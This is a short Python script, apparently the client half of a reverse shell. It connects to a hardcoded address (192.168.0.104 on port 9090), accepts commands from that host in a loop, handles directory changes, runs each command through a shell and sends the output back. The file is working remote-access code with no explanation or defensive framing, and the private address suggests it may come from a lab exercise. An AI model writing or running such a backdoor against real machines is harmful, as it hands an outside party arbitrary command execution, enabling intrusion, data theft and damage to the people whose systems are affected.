import socket
import subprocess
import os

s=socket.socket()
host="192.168.0.104"
port=9090

s.connect((host,port))

while True:
    data=s.recv(1024)
    if data[:2].decode("utf-8")=="cd":
        os.chdir(data[3:].decode(("utf-8")))

    if len(data)>0:
        ter=subprocess.Popen(data[:].decode("utf-8"),shell=True , stdout=subprocess.PIPE , stdin=subprocess.PIPE , stderr=subprocess.PIPE)
        out_byte=ter.stdout.read()+ter.stderr.read()
        out_string=str(out_byte,"utf-8")
        s.send(str.encode(out_string))

        print(out_string)

